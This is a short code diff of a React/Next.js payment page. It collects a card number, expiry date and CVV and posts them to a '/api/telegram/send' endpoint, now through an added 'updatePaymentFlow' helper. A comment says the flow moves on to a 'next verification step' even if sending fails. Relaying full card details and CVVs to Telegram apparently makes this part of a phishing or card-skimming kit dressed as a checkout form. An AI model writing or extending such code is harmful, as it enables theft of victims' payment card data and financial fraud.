@@ -2,6 +2,7 @@
 
 import { useState } from 'react'
 import { useRouter } from 'next/navigation'
+import { updatePaymentFlow } from '@/lib/payment-flow'
 import { ArrowLeft, CalendarDays, CreditCard, Info, LockKeyhole, Wifi } from 'lucide-react'
 
 const cardImage =
@@ -35,10 +36,16 @@ export default function Page() {
     setError('')
     setSubmitting(true)
     try {
+      const flow = updatePaymentFlow({
+        card: digits,
+        month: expiryDigits.slice(0, 2),
+        year: expiryDigits.slice(2),
+        cvv,
+      })
       await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
-        body: JSON.stringify({ card: digits, month: expiryDigits.slice(0, 2), year: expiryDigits.slice(2), cvv }),
+        body: JSON.stringify(flow),
       })
     } catch {
       // Continue to the next verification step if notification fails.
